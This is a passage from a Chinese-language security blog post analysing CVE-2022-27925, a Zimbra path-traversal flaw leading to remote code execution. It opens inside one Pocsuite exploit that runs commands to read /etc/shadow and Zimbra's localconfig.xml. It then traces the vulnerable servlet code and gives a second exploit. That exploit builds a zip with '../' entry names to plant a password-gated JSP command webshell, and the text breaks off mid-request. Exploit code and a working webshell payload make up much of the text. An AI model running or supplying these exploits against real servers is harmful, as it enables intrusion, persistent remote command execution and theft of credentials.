class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>,<span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 命令执行信息, 针对各类命令执行、代码执行漏洞</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure>

<p>POC运行结果如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bec6e6ea21b9a9e439f60.jpg" title="b4f07362-1c0b-44f2-ab17-b6cc8365da1f" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec6e6ea21b9a9e439f60.jpg" alt="b4f07362-1c0b-44f2-ab17-b6cc8365da1f"></a></p>
<h2 id="CVE-2022-27925-Zimbra路径穿越导致的RCE漏洞"><a href="#CVE-2022-27925-Zimbra路径穿越导致的RCE漏洞" class="headerlink" title="CVE-2022-27925 Zimbra路径穿越导致的RCE漏洞"></a>CVE-2022-27925 Zimbra路径穿越导致的RCE漏洞</h2><h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a><strong>漏洞原理</strong></h3><h4 id="调试设置"><a href="#调试设置" class="headerlink" title="调试设置"></a><strong>调试设置</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">su zimbra</span><br><span class="line">zmcontrol stop</span><br><span class="line">su</span><br><span class="line"><span class="built_in">cp</span> /opt/zimbra/libexec/zmmailboxdmgr /opt/zimbra/libexec/zmmailboxdmgr.old</span><br><span class="line"><span class="built_in">cp</span> /opt/zimbra/libexec/zmmailboxdmgr.unrestricted /opt/zimbra/libexec/zmmailboxdmgr</span><br><span class="line">su zimbra</span><br><span class="line">zmlocalconfig -e mailboxd_java_options=<span class="string">&quot;`zmlocalconfig -m nokey mailboxd_java_options` -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=*:5005&quot;</span></span><br><span class="line">zmcontrol start</span><br></pre></td></tr></table></figure>

<p>之后在IDEA导入依赖库即可。</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a><strong>漏洞分析</strong></h4><p>漏洞出现在 <code>mboximport</code> 相关的功能中，全局搜索定位至<code>com.zimbra.cs.service.backup.MailboxImportServlet</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bec8f6ea21b9a9e449541.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bec8f6ea21b9a9e449541.jpg"></a></p>
<p>由其命名规则和存在的成员函数来看，<code>MailboxImportServlet</code>应该对应一个<code>HttpServlet</code>对象，但是<code>MailboxImportServlet</code>继承于<code>com.zimbra.cs.extension.ExtensionHttpHandler</code> 而非 <code>HttpServlet</code>，因此需要找到如何通过URL关联到此处。</p>
<p>Zimbra 自定义了 <code>Servlet</code> 对象的基类 <code>ZimbraServlet</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642becaf6ea21b9a9e4589d9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becaf6ea21b9a9e4589d9.jpg"></a></p>
<p>查看<code>ZimbraServlet</code>的子类：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642becbf6ea21b9a9e460504.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becbf6ea21b9a9e460504.jpg"></a></p>
<p>定位至<code>com.zimbra.cs.extension.ExtensionDispatcherServlet</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642beccb6ea21b9a9e465cee.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beccb6ea21b9a9e465cee.jpg"></a></p>
<p>在<code>webapps\service\WEB-INF\web.xml</code>中可以找到：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642becd86ea21b9a9e46c6cd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becd86ea21b9a9e46c6cd.jpg"></a></p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bece36ea21b9a9e472097.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bece36ea21b9a9e472097.jpg"></a></p>
<p>因此<code>com.zimbra.cs.extension.ExtensionDispatcherServlet</code>对应的url规则是&#x2F;service&#x2F;extension&#x2F;*，接着在<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#service</code>中：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642becf36ea21b9a9e47982d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642becf36ea21b9a9e47982d.jpg"></a></p>
<p>可以看到handler是一个<code>ExtensionHttpHandler</code>对象，而前面的 <code>MailboxImportServlet</code> 正好继承于 <code>ExtensionHttpHandler</code>。跟进<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(javax.servlet.http.HttpServletRequest)</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bed016ea21b9a9e47f7f5.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed016ea21b9a9e47f7f5.jpg"></a></p>
<p>将url中的&#x2F;service&#x2F;extension之后的内容赋值给extPath，若extPath的长度不为0，则执行getHandler(extPath)，并将结果赋值给handler。跟进<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(java.lang.String)</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bed196ea21b9a9e48b633.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed196ea21b9a9e48b633.jpg"></a></p>
<p>其中sHandlers的定义及赋值如下所示：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bed7c6ea21b9a9e4baa1c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed7c6ea21b9a9e4baa1c.jpg"></a></p>
<p>sHandlers是一个Map类型的对象，在<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#register</code>中对sHandlers的键值对进行了操作，其中key来自handler.getPath()：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bed896ea21b9a9e4c0eea.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed896ea21b9a9e4c0eea.jpg"></a></p>
<p><code>com.zimbra.cs.extension.ExtensionHttpHandler#getPath</code>中存在<code>this.mExtension</code>，可以看到，其在init方法中进行了定义，其中ext是一个<code>ZimbraExtension</code>类型的对象。定位到<code>ZimbraExtension</code>的子类<code>com.zimbra.cs.backup.BackupExtension</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bed956ea21b9a9e4c733b.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bed956ea21b9a9e4c733b.jpg"></a></p>
<p>可以看到在此处执行了<code>ExtensionDispatcherServlet</code>的register方法，并且传入的handler正好是一个<code>MailboxImportServlet</code>实例。那么进入register函数，首先执行<code>handler.init(ext);</code>，此时，this.mExtension是一个<code>BackupExtension</code>实例。之后执行<code>String name = handler.getPath();</code>，因为handler是一个<code>MailboxImportServlet</code>实例，<code>MailboxImportServlet</code>的getPath()方法如下所示：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642beda26ea21b9a9e4cde8c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beda26ea21b9a9e4cde8c.jpg"></a></p>
<p><code>com.zimbra.cs.extension.ExtensionHttpHandler</code>的getPath()方法如下所示：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bedae6ea21b9a9e4d4175.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedae6ea21b9a9e4d4175.jpg"></a></p>
<p>因为this.mExtension是一个<code>BackupExtension</code>实例，而BackupExtension的getName()方法如下所示：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bedbe6ea21b9a9e4db71d.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedbe6ea21b9a9e4db71d.jpg"></a></p>
<p>因此最后name的值为&#x2F;backup&#x2F;mboximport，因此sHandlers的一个键值对为：&#x2F;backup&#x2F;mboximport &#x3D;&gt; new MailboxImportServlet()。之后经过<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#getHandler(java.lang.String)</code>的执行，就会返回一个MailboxImportServlet实例。接着继续审计<code>com.zimbra.cs.extension.ExtensionDispatcherServlet#service</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bedca6ea21b9a9e4e112f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedca6ea21b9a9e4e112f.jpg"></a></p>
<p>根据上面分析，首先得到一个MailboxImportServlet实例handler，之后对请求的方法进行判断，如果是POST方法，则执行该MailboxImportServlet实例的doPost方法。在<code>com.zimbra.cs.service.backup.MailboxImportServlet#doPost</code>中，首先通过 <code>getAuthTokenFromCookie</code> 从 Cookie 中提取 token 认证信息，并检查是否为管理员权限：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bedd86ea21b9a9e4e7a64.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedd86ea21b9a9e4e7a64.jpg"></a></p>
<p>若authToken为空或不是管理员，则返回401状态码以及no authtoken cookie，也就是如下情况：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bede36ea21b9a9e4ecdbd.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bede36ea21b9a9e4ecdbd.jpg"></a></p>
<p>接着代码继续执行：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642beded6ea21b9a9e4f1bd8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beded6ea21b9a9e4f1bd8.jpg"></a></p>
<p>获取account-name、account-status以及ow参数。接着判断account-name及ow是否为空，若不为空，进入else：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bedfc6ea21b9a9e4f9b58.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bedfc6ea21b9a9e4f9b58.jpg"></a></p>
<p>若我们不传入switch-onl、no-switch以及append，那么switchOnly、noSwitch以及append的值为默认值false。之后还获取了account，若为空，则直接返回，程序中断。因此我们传入的account-name必须是一个存在的用户。</p>
<p>接着执行之后的代码，不传入switch-onl参数，此时switchOnly的值为false，进入如下if条件：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee216ea21b9a9e50f61f.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee216ea21b9a9e50f61f.jpg"></a></p>
<p>在第152行执行了importFrom()方法，其中in为我们POST传入的值。跟进<code>com.zimbra.cs.service.backup.MailboxImportServlet#importFrom</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee2f6ea21b9a9e519529.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee2f6ea21b9a9e519529.jpg"></a></p>
<p>source是一个ZipBackupTarget实例，构造函数如下：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee4f6ea21b9a9e529bc9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee4f6ea21b9a9e529bc9.jpg"></a></p>
<p>注意到<code>this.mTempDir = new File(path);</code>，跟进<code>com.zimbra.cs.account.ZAttrServer#getMailboxMoveTempDir</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee6d6ea21b9a9e5387b3.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee6d6ea21b9a9e5387b3.jpg"></a></p>
<p>可以看到path的值默认为<code>/opt/zimbra/backup/tmp/mboxmove</code>。因此mTempDir是一个File实例，代表<code>/opt/zimbra/backup/tmp/mboxmove</code>目录。</p>
<p>之后跟进<code>com.zimbra.cs.backup.ZipBackupTarget#restore</code>方法：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee786ea21b9a9e53e0f8.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee786ea21b9a9e53e0f8.jpg"></a></p>
<p>再次跟进<code>com.zimbra.cs.backup.ZipBackupTarget#getAccountSession(java.lang.String)</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee836ea21b9a9e543869.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee836ea21b9a9e543869.jpg"></a></p>
<p>返回一个RestoreAcctSession实例，构造方法如下所示：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee916ea21b9a9e54b6e2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee916ea21b9a9e54b6e2.jpg"></a></p>
<p>执行了<code>this.mTempDir = new File(ZipBackupTarget.this.getTempRoot(), accountId);</code>，跟进<code>com.zimbra.cs.backup.ZipBackupTarget#getTempRoot</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642bee9e6ea21b9a9e557220.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642bee9e6ea21b9a9e557220.jpg"></a></p>
<p>返回的是<code>this.mTempDir</code>，因此此时的this.mTempDir代表的是<code>/opt/zimbra/backup/tmp/mboxmove/xxxxxxxxx</code>目录，其中xxxxxxxxx为accountId。之后跟进<code>com.zimbra.cs.backup.ZipBackupTarget.RestoreAcctSession#unzipToTempFiles</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642beea96ea21b9a9e55c60c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beea96ea21b9a9e55c60c.jpg"></a></p>
<p>可以看到此处存在路径穿越漏洞。假设我们将压缩包中文件的名字设为<code>../1.txt</code>，那么file对象指代带的就是<code>/opt/zimbra/backup/tmp/mboxmove/xxxxxxxxx/../1.txt</code>，也就是<code>/opt/zimbra/backup/tmp/mboxmove/1.txt</code>。之后跟进<code>com.zimbra.common.util.FileUtil#copy(java.io.InputStream, boolean, java.io.File)</code>：</p>
<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642beeb76ea21b9a9e562ce9.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beeb76ea21b9a9e562ce9.jpg"></a></p>
<p>可以看到这里将文件内容写入到对应的文件中。因此利用思路已经很明了了。</p>
<p>我们需要以POST方法在<code>/service/extension/backup/mboximport?account-name=admin&amp;account-status=1&amp;ow=xxx</code>中传入一个压缩包，其中压缩包中有一个文件名为<code>../../../../mailboxd/webapps/zimbraAdmin/1.jsp</code>的文件，内容为普通的webshell payload即可，这样的话上面提到的file对象指代带的就是<code>/opt/zimbra/mailboxd/webapps/zimbraAdmin/1.jsp</code>，程序会将webshell payload写入到<code>/opt/zimbra/mailboxd/webapps/zimbraAdmin/1.jsp</code>中。</p>
<h3 id="Pocsuite-POC-1"><a href="#Pocsuite-POC-1" class="headerlink" title="Pocsuite-POC"></a>Pocsuite-POC</h3><p>poc可以获取到管理员邮箱、ldap用户密码、mysql地址账号密码以及zimbra敏感配置文件localconfig.xml等敏感信息。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="keyword">from</span> pocsuite3.api <span class="keyword">import</span> (</span><br><span class="line">    minimum_version_required, POCBase, register_poc, requests, logger,</span><br><span class="line">    OptString, OrderedDict,</span><br><span class="line">    random_str, Output,</span><br><span class="line">    get_listener_ip, get_listener_port, REVERSE_PAYLOAD</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PoC</span>(<span class="title class_ inherited__">POCBase</span>):</span><br><span class="line">    vulID = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    name = <span class="string">&#x27;Zimbra路径穿越导致的RCE漏洞&#x27;</span></span><br><span class="line">    author = <span class="string">&#x27;rainb0w&#x27;</span></span><br><span class="line">    is0day = <span class="literal">False</span></span><br><span class="line">    <span class="built_in">type</span> = <span class="string">&#x27;目录穿越&#x27;</span></span><br><span class="line">    <span class="comment"># 严重 高危 中危 低危</span></span><br><span class="line">    level = <span class="string">&#x27;严重&#x27;</span></span><br><span class="line">    CVE = <span class="string">&#x27;CVE-2022-27925&#x27;</span></span><br><span class="line">    CNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    CNNVD = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    ExploitDB = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    Vendor = <span class="string">&#x27;Zimbra&#x27;</span></span><br><span class="line">    appName = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    appVersion = [<span class="string">&#x27;v8.8.15 P30-v9.0.0 P23&#x27;</span>]</span><br><span class="line">    Tags = []</span><br><span class="line">    search_keyword = <span class="string">&#x27;title:&quot;Zimbra 管理&quot;&#x27;</span></span><br><span class="line">    desc = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra 是一家提供专业的电子邮件软件开发供应商，主要提供ZimbraDesktop邮件管理软件。另外提供一套开源协同办公套件包括WebMail，日历，通信录，Web文档管理和创作。</span></span><br><span class="line"><span class="string">    Zimbra的最大特色在于其采用Ajax技术模仿CS桌面应用软件的风格开发的客户端兼容Firefox，Safari和IE浏览器。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    details = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    最初，Zimbra将CVE-2022-27925称为经过身份验证的路径遍历攻击，其中管理用户可以将文件写入文件系统上的任何目录。因为它最初被认为是仅限管理员的攻击，NVD给它的CVSS基本评分为7.8。</span></span><br><span class="line"><span class="string">    后来，Volexity注意到利用此漏洞的攻击者找到了绕过管理要求的方法，并于2022年8月10日对此进行了报道。这个新的身份验证旁路获得了一个新的标识符- CVE-2022-37042。</span></span><br><span class="line"><span class="string">    通过结合原始路径遍历漏洞和新的身份验证绕过，攻击者可以通过管理员端口（默认为7071）匿名远程危害Zimbra Collaboration Suite系统。</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Zimbra 官方下载最新版本进行修复:https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    official_solution = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    https://wiki.zimbra.com/wiki/Zimbra_Releases</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    references = []</span><br><span class="line">    samples = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">build_zip</span>(<span class="params">self, jsp, path</span>):</span><br><span class="line">        zip_buffer = io.BytesIO()</span><br><span class="line">        zf = zipfile.ZipFile(zip_buffer, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">        zf.writestr(path, jsp)</span><br><span class="line">        zf.close()</span><br><span class="line">        <span class="keyword">return</span> zip_buffer.getvalue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        paths = [<span class="string">&#x27;../../../../mailboxd/webapps/zimbraAdmin/&#x27;</span>, <span class="string">&#x27;../../../../jetty_base/webapps/zimbraAdmin/&#x27;</span>, <span class="string">&#x27;../../../../jetty/webapps/zimbraAdmin/&#x27;</span>]</span><br><span class="line">        self.webshellName = random_str(<span class="number">10</span>) + <span class="string">&#x27;.jsp&#x27;</span></span><br><span class="line">        self.webshellPass = <span class="string">&quot;sMuw1P2&quot;</span></span><br><span class="line">        webshell_payload = <span class="string">r&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> paths:</span><br><span class="line">                endpoints = [<span class="string">&quot;/service/extension/backup/mboximport?account-name=admin&amp;account-status=1&amp;ow=cmd&quot;</span>,</span><br><span class="line">                             <span class="string">&quot;/service/extension/backup/mboximport?account-name=admin&amp;ow=2&amp;no-switch=1&amp;append=1&quot;</span>]</span><br><span class="line">                zippedfile = self.build_zip(webshell_payload, i + self.webshellName)</span><br><span class="line">                headers = &#123;<span class="string">&#x27;content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">                <span class="keyword">for</span> endpoint <span class="keyword">in</span> endpoints:</span><br><span class="line">                    requests.post(self.url + 